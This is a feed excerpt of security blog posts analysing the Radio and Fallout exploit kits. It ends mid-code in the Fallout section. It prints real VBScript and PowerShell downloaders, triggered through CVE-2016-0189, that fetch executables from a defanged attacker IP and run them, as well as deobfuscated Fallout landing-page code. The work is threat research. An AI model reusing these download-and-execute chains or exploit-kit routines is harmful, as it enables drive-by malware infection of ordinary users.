<span class="k">Set</span> <span class="n">good</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">good</span> <span class="o">=</span> <span class="mi">200</span>
<span class="c1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''1</span>
<span class="n">set</span> <span class="n">d</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.Dictionary"</span><span class="p">)</span>

<span class="n">d</span><span class="p">.</span><span class="n">Add</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">""</span> <span class="o">&amp;</span> <span class="n">css</span> <span class="o">&amp;</span> <span class="s">"1.jpg|"</span><span class="o">&amp;</span><span class="n">temp&amp;</span><span class="s">""</span> <span class="o">&amp;</span> <span class="n">css1</span> <span class="o">&amp;</span> <span class="s">""</span> <span class="o">&amp;</span> <span class="n">ico</span> <span class="o">&amp;</span> <span class="s">""</span>
<span class="k">Set</span> <span class="n">ar1</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"MSXML2.XMLHTTP"</span><span class="p">)</span>
<span class="k">For</span> <span class="k">Each</span> <span class="n">i</span> <span class="ow">In</span> <span class="n">d</span> 
<span class="n">ar1</span><span class="p">.</span><span class="n">open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">Split</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"|"</span><span class="p">)(</span><span class="mi">0</span><span class="p">),</span> <span class="n">false</span>
<span class="n">ar1</span><span class="p">.</span><span class="n">send</span><span class="p">()</span>
<span class="k">If</span> <span class="n">ar1</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">good</span> <span class="k">Then</span>
<span class="k">With</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">)</span>
<span class="p">.</span><span class="n">Open</span>
<span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">1</span>
<span class="p">.</span><span class="n">Write</span> <span class="n">ar1</span><span class="p">.</span><span class="n">ResponseBody</span>
<span class="p">.</span><span class="n">Position</span> <span class="o">=</span> <span class="mi">0</span>
<span class="p">.</span><span class="n">SaveToFile</span> <span class="n">Split</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"|"</span><span class="p">)(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">2</span>
<span class="p">.</span><span class="n">Close</span>
<span class="k">End</span> <span class="k">With</span>
<span class="n">set</span> <span class="n">WshShell</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="n">WshShell</span><span class="p">.</span><span class="n">Run</span> <span class="n">temp</span> <span class="o">&amp;</span> <span class="s">""</span><span class="o">&amp;</span> <span class="n">css1</span> <span class="o">&amp;</span><span class="s">""</span> <span class="o">&amp;</span> <span class="n">ico</span> <span class="o">&amp;</span> <span class="s">""</span><span class="p">,</span> <span class="p">,</span><span class="n">true</span>
<span class="k">End</span> <span class="k">If</span>
<span class="k">Next</span>
</code></pre></div></div>

<p>This process is repeated from <code class="language-plaintext highlighter-rouge">1.jpg</code> to<code class="language-plaintext highlighter-rouge"> 5.jpg</code> in order. The <code class="language-plaintext highlighter-rouge">1.jpg</code> downloaded and executed in this way is malware. Malware is unencrypted and is plain binary.</p>

<h3 id="v11">v1.1</h3>
<p>Next, let’s look at v1.1.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-16/1.1.png" /></p>

<p>For v1.1, the code executed by CVE-2016-0189 is as follows:</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="kt">Object</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Shell.Application"</span><span class="p">)</span>
<span class="kt">Object</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="s">"PowerShell"</span><span class="p">,</span>  <span class="s">"(New-Object System.Net.WebClient).DownloadString('https[:]//2no.co/1ehqM6');$local_path = [System.IO.Path]::GetTempPath();(New-Object System.Net.WebClient).DownloadFile('http[:]//95.215.207.24/error.jp', $local_path+'documentation.vbs');$local_path2 = [System.IO.Path]::GetTempPath()+'documentation.vbs';Start-Process $local_path2"</span>
</code></pre></div></div>

<p>Unlike v1.0, the VBScript URL to be loaded next is <code class="language-plaintext highlighter-rouge">http[:]//95.215.207.24/error.jp</code>. At this time, the end of the URL is <code class="language-plaintext highlighter-rouge">.jp</code>. I don’t know if this is a mistake in hitting <code class="language-plaintext highlighter-rouge">jpg</code> or meaning <code class="language-plaintext highlighter-rouge">Japan</code>.</p>

<p><code class="language-plaintext highlighter-rouge">error.jp</code> will execute code similar to v1.0 <code class="language-plaintext highlighter-rouge">load2.jpg</code>.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="n">css</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">css</span> <span class="o">=</span> <span class="s">"http[:]//95.215.207.24/im/"</span>
<span class="n">ico</span> <span class="o">=</span> <span class="s">".exe"</span>
<span class="n">css1</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">css2</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">101</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
<span class="n">css3</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">201</span><span class="p">,</span> <span class="mi">300</span><span class="p">)</span>
<span class="n">css4</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">301</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
<span class="n">css5</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">401</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>

<span class="k">Set</span> <span class="n">oShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span> <span class="s">"WScript.Shell"</span> <span class="p">)</span>
<span class="n">temp</span><span class="o">=</span><span class="n">oShell</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s">"%TEMP%\"</span><span class="p">)</span>
<span class="k">Dim</span> <span class="nv">good</span>
<span class="k">Set</span> <span class="n">good</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">good</span> <span class="o">=</span> <span class="mi">200</span>
<span class="c1">''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''1</span>
<span class="n">set</span> <span class="n">d</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.Dictionary"</span><span class="p">)</span>

<span class="n">d</span><span class="p">.</span><span class="n">Add</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">""</span> <span class="o">&amp;</span> <span class="n">css</span> <span class="o">&amp;</span> <span class="s">"1.jpg|"</span><span class="o">&amp;</span><span class="n">temp&amp;</span><span class="s">""</span> <span class="o">&amp;</span> <span class="n">css1</span> <span class="o">&amp;</span> <span class="s">""</span> <span class="o">&amp;</span> <span class="n">ico</span> <span class="o">&amp;</span> <span class="s">""</span>
<span class="k">Set</span> <span class="n">ar1</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"MSXML2.XMLHTTP"</span><span class="p">)</span>
<span class="k">For</span> <span class="k">Each</span> <span class="n">i</span> <span class="ow">In</span> <span class="n">d</span> 
<span class="n">ar1</span><span class="p">.</span><span class="n">open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">Split</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"|"</span><span class="p">)(</span><span class="mi">0</span><span class="p">),</span> <span class="n">false</span>
<span class="n">ar1</span><span class="p">.</span><span class="n">send</span><span class="p">()</span>
<span class="k">If</span> <span class="n">ar1</span><span class="p">.</span><span class="n">Status</span> <span class="o">=</span> <span class="n">good</span> <span class="k">Then</span>
<span class="k">With</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"ADODB.Stream"</span><span class="p">)</span>
<span class="p">.</span><span class="n">Open</span>
<span class="p">.</span><span class="n">Type</span> <span class="o">=</span> <span class="mi">1</span>
<span class="p">.</span><span class="n">Write</span> <span class="n">ar1</span><span class="p">.</span><span class="n">ResponseBody</span>
<span class="p">.</span><span class="n">Position</span> <span class="o">=</span> <span class="mi">0</span>
<span class="p">.</span><span class="n">SaveToFile</span> <span class="n">Split</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"|"</span><span class="p">)(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">2</span>
<span class="p">.</span><span class="n">Close</span>
<span class="k">End</span> <span class="k">With</span>
<span class="n">set</span> <span class="n">WshShell</span> <span class="o">=</span> <span class="n">WScript</span><span class="p">.</span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="n">WshShell</span><span class="p">.</span><span class="n">Run</span> <span class="n">temp</span> <span class="o">&amp;</span> <span class="s">""</span><span class="o">&amp;</span> <span class="n">css1</span> <span class="o">&amp;</span><span class="s">""</span> <span class="o">&amp;</span> <span class="n">ico</span> <span class="o">&amp;</span> <span class="s">""</span><span class="p">,</span> <span class="p">,</span><span class="n">true</span>
<span class="k">End</span> <span class="k">If</span>
<span class="k">Next</span>
</code></pre></div></div>

<p>This is also repeated until <code class="language-plaintext highlighter-rouge">/im/5.jpg</code>. The downloaded / executed <code class="language-plaintext highlighter-rouge">/im/1.jpg</code> is malware. As in v1.0, malware is not encrypted.</p>

<h3 id="v120">v1.2.0</h3>
<p>Finally, let’s look at v1.2.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-16/1.2.png" /></p>

<p>It became very simple. It can be said that nothing is over. The code executed by CVE-2016-0189 is as follows:</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="kt">Object</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Shell.Application"</span><span class="p">)</span>
<span class="kt">Object</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="s">"PowerShell"</span><span class="p">,</span>  <span class="s">"(New-Object System.Net.WebClient).DownloadString('https[:]//2no.co/1YdQt7');$local_path = [System.IO.Path]::GetTempPath();(New-Object System.Net.WebClient).DownloadFile('http[:]//95.215.207.24/im/1.jpg', $local_path+'documentation.exe');$local_path2 = [System.IO.Path]::GetTempPath()+'documentation.exe';Start-Process $local_path2"</span>
</code></pre></div></div>

<p>Thus, <code class="language-plaintext highlighter-rouge">/im/1.jpg</code> downloaded and executed is malware. As before, malware is not encrypted.</p>

<p>The path of <code class="language-plaintext highlighter-rouge">/im/1.jpg</code> has only changed since v1.2.0. The essential process is the same.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Radio EK is active, but its attack power is very low. Compared to RIG and Fallout, the threat is not something that bothers you. However, there may be aggressive updates in the future. You should be aware of the existence of this EK.</p>
]]></content:encoded>
<pubDate>2019-07-15T15:00:00+00:00</pubDate>
</item>
<item>
<title>Steady Evolution of Fallout v4</title>
<link>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</link>
<guid>http://nao-sec.org/2019/07/steady-evolution-of-fallout-v4.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>We have been observing the Fallout Exploit Kit since August 2018. Fallout is using non-characteristic URL and heavily obfuscated landing page. The user still exists and attacks are observed daily. Recently, we were investigating an attack campaign that infects Raccoon Stealer in the flow of PopAds-&gt; KeitaroTDS-&gt; Fallout.</p>

<p>About Fallout, we have already written three reports. The first one was about the emergence of Fallout, the second one was to start using PowerShell and the third one was to start exploiting PoC on GitHub. We divide these major changes by version and call them v1~3.</p>

<ul>
  <li><a href="https://nao-sec.org/2018/09/hello-fallout-exploit-kit.html">Hello “Fallout Exploit Kit”</a></li>
  <li><a href="https://nao-sec.org/2019/01/in-depth-analysis-of-new-fallout.html">In-Depth analysis of new Fallout Exploit Kit</a></li>
  <li><a href="https://nao-sec.org/2019/03/analysis-of-fallout-exploit-kit-v3.html">Analysis of Fallout Exploit Kit v3</a></li>
</ul>

<p>We wrote about v3 in March 2019. v3 is not stable and has been updated to the next version immediately. @EKFiddle (created and maintained by @jeromesegura) reported this change on April 11.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en"><a href="https://twitter.com/hashtag/EKFiddle?src=hash&amp;ref_src=twsrc%5Etfw">#EKFiddle</a> [Regex update]: <a href="https://twitter.com/hashtag/FalloutEK?src=hash&amp;ref_src=twsrc%5Etfw">#FalloutEK</a><br />Seems like there is no more use of the PoC on GitHub for CVE-2018-8174.<br />Pushing <a href="https://twitter.com/hashtag/GandCrab?src=hash&amp;ref_src=twsrc%5Etfw">#GandCrab</a> in this particular instance.<a href="https://t.co/U67qZosp1e">https://t.co/U67qZosp1e</a> <a href="https://t.co/buVTakYuhJ">pic.twitter.com/buVTakYuhJ</a></p>&mdash; EKFiddle (@EKFiddle) <a href="https://twitter.com/EKFiddle/status/1116134534989238272?ref_src=twsrc%5Etfw">2019年4月11日</a></blockquote>


<p>We call this a big update v4 (it is still v4). Detailed analysis report has not been written about what kind of update Fallout has done. However, this update is very big. At least for us (Exploit Kit analyst), that made the analysis very cumbersome. Fallout v4 incorporates the following features.</p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Diffie-Hellman key exchange
<span class="p">2.</span> VM detection
<span class="p">3.</span> Process detection
</code></pre></div></div>

<p>Here, we will share detailed analysis results on the updates made by Fallout v4. But unfortunately, we did not understand everything. If you are aware of it, please help us.</p>

<h2 id="traffic-chain">Traffic chain</h2>
<p>First, let’s look at the previous traffic chain. v1~3 was like this.</p>

<p><img alt="" src="https://4.bp.blogspot.com/-eXpYD_rUFwU/W4loVPM1TTI/AAAAAAAAAVI/XuE3p36q7QMAVw95gBYPkKOA-IhsdaoAQCLcBGAs/s1600/0.png" />
<img alt="" src="https://3.bp.blogspot.com/-_qnvJOfIOeE/XEiKt9Zs16I/AAAAAAAAAYI/tspkgYcwxe0YjeGhaTGofsUBpfmhjJzmwCLcBGAs/s1600/0.png" />
<img alt="" src="https://nao-sec.org/assets/2019-03-07/01.png" /></p>

<p>In v3, it acquired PoC of CVE-2018-8174 from GitHub, and attacked by rewriting the part of shellcode. So what kind of traffic chain is v4?</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/01.png" /></p>

<div class="language-md highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">1.</span> Landing Page
<span class="p">2.</span> JavaScript Code
<span class="p">3.</span> Encoded Code 1
<span class="p">4.</span> Encoded Code 2 (CVE-2018-8174 + SWF Loader)
<span class="p">5.</span> CVE-2018-15982
<span class="p">6.</span> PowerShell Code
<span class="p">7.</span> Malware
</code></pre></div></div>

<p>In this way, an attack is performed by seven traffics. Let’s look at each one in order. (In the following, we will use different traffic data from the above. The detailed reason will be mentioned later, but it is difficult to capture and analyze traffic at the same time)</p>

<h2 id="landing-page--js-code--encoded-data">Landing Page + JS Code + Encoded Data</h2>
<p>In the landing page, JavaScript code is read first.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">http-equiv=</span><span class="s">"x-ua-compatible"</span> <span class="na">content=</span><span class="s">"IE=10"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span> <span class="na">src=</span><span class="s">"/04_09_2003/Symposium?Peristele=02_03_1943&amp;LE3r=Aps&amp;ILZhH=Frazzling-Anorexias"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>
</code></pre></div></div>

<p>This includes CryptoJS and BigInteger obfuscated. Excluding the large library parts, there is very little processing.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// key</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">III1l1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">8b69cbdfc5fe43e69b7920c8ee721fc9</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// iv</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">II1ll11I</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1I1lI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">ll1llI1</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">301ae8205ddcd5897df69e3b0c056c34</span><span class="dl">"</span><span class="p">);</span>
<span class="c1">// aes_decrypt(enc_data, key, iv)</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">l11llIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">lI11lIl</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">l11II11l</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2">p4N9IqH/oiAKHkDCR0zXXfrvhwVrVPsFZSNUjkVFXxxBofjpd5JLM1sdAega3oRy</span><span class="dl">"</span><span class="p">,</span> <span class="nx">III1l1</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">lI1lIl1Ill</span><span class="p">:</span> <span class="nx">II1ll11I</span>
<span class="p">})[</span><span class="dl">"</span><span class="s2">lIlIlll11l</span><span class="dl">"</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">Il1IIllIlI1I</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">IIIlI</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">Il11I1II</span><span class="dl">"</span><span class="p">]);</span>
</code></pre></div></div>

<p>First, two data (<code class="language-plaintext highlighter-rouge">8b69cbdfc5fe43e69b7920c8ee721fc9</code> and <code class="language-plaintext highlighter-rouge">301ae8205ddcd5897df69e3b0c056c34</code>) will appear. This is a key and an IV for AES encryption. By decrypting the next Base64 character string using these keys and IV, the necessary data (specifically, the URL for acquiring encoded data used in the next step) can be obtained. . When it tries decoding, it becomes like this.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-09/02.png" /></p>

<p>Next is the process of checking which browser is being used. Depending on it, Opera, Firefox, IE or Chrome is investigated.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// check browser</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">String</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">prototype</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">II1l1IlI</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opr</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">addons</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">opera</span><span class="dl">"</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">indexOf</span><span class="dl">"</span><span class="p">](</span><span class="dl">"</span><span class="s2"> OPR/</span><span class="dl">"</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">InstallTrigger</span><span class="dl">"</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">"</span><span class="s2">undefined</span><span class="dl">"</span><span class="p">)</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">document</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">documentMode</span><span class="dl">"</span><span class="p">])</span>
    <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">"</span><span class="s2">chrome</span><span class="dl">"</span><span class="p">][</span><span class="dl">"</span><span class="s2">runtime</span><span class="dl">"</span><span class="p">])</span>
<span class="p">};</span>
</code></pre></div></div>

<p>Then there is a process to check the version of Adobe Flash Player. This data will be used later.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">l1l111I</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">'</span><span class="s1">ShockwaveFlash.ShockwaveFlash</span><span class="dl">'</span><span class="p">).</span><span class="nx">getVariable</span><span class="p">(</span><span class="dl">'</span><span class="s1">$version</span><span class="dl">'</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
<span class="p">})();</span>
</code></pre></div></div>

<p>The process then returns to the landing page. In the landing page, one function is defined and executed. Let’s look at that function.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// str_A</span>
<span class="kd">var</span> <span class="nx">l1ll1</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">]();</span>
<span class="c1">// str_B</span>
<span class="kd">var</span> <span class="nx">lIlII11</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_C</span>
<span class="kd">var</span> <span class="nx">ll1l1IlIIIll</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>
<span class="c1">// str_D</span>
<span class="kd">var</span> <span class="nx">lll1II</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">l1l1IIlIlI</span><span class="dl">'</span><span class="p">](</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">Il1IIllIlI1I</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">lIIIlI1IlII</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">I111l11l</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">II1I1I</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">)[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](),</span> <span class="mi">16</span><span class="p">);</span>

<span class="c1">// str_E =&gt; str_B.modPow(str_C, str_D)</span>
<span class="kd">var</span> <span class="nx">l11IlIl</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">ll11IIl</span><span class="dl">'</span><span class="p">](</span><span class="nx">ll1l1IlIIIll</span><span class="p">,</span> <span class="nx">lll1II</span><span class="p">);</span>
</code></pre></div></div>

<p>Here, many processes such as <code class="language-plaintext highlighter-rouge">window['Il1IIllIlI1I']['lIIIlI1IlII']['I111l11l']['II1I1I'](16)['lIlIlll11l']()</code> appear. This is defined in CryptoJS and generates a 32 character random hexadecimal string. After generating four random data, use the second, third and fourth of them to generate the fifth data. Here modPow is used. The five data prepared here will be used in the ensuing cryptographic process. We call them str_A, str_B, str_C, str_D, str_E.</p>

<p>The following code is divided into three parts. <code class="language-plaintext highlighter-rouge">Onreadystatechange</code> after the first one has sent a request to the server. The process of generating data to be sent by the second. The third is the process to send. These are the standard XMLHttpRequest POST procedures. First, let’s look at the process of generating transmission data.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">l11IlIIlllll</span> <span class="o">=</span> <span class="p">{};</span>

<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlII11</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lIlII11</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_B</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lll1II</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">lll1II</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>      <span class="c1">// str_D</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">l11IlIl</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l11IlIl</span><span class="p">[</span><span class="dl">'</span><span class="s1">lIlIlll11l</span><span class="dl">'</span><span class="p">](</span><span class="mi">16</span><span class="p">);</span>    <span class="c1">// str_E</span>
<span class="nx">l11IlIIlllll</span><span class="p">[</span><span class="dl">'</span><span class="s1">lI1lIl1Ill</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1ll1</span><span class="p">;</span>                     <span class="c1">// str_A</span>

<span class="c1">// browser check data</span>
